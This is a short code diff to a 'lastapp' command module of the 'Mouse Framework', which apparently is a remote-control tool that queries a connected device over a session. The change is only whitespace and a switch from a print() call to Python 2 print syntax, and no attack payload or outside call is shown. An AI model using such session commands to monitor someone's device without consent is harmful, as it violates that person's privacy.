@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 #            ---------------------------------------------------
-#                              Mouse Framework
+#                              Mouse Framework                                 
 #            ---------------------------------------------------
 #                Copyright (C) <2019-2020>  <Entynetproject>
 #
@@ -22,6 +22,6 @@ class command:
     def __init__(self):
         self.name = "lastapp"
         self.description = "Get last opened application."
-
+    
     def run(self,session,cmd_data):
-        print(session.send_command(cmd_data))
+        print session.send_command(cmd_data)
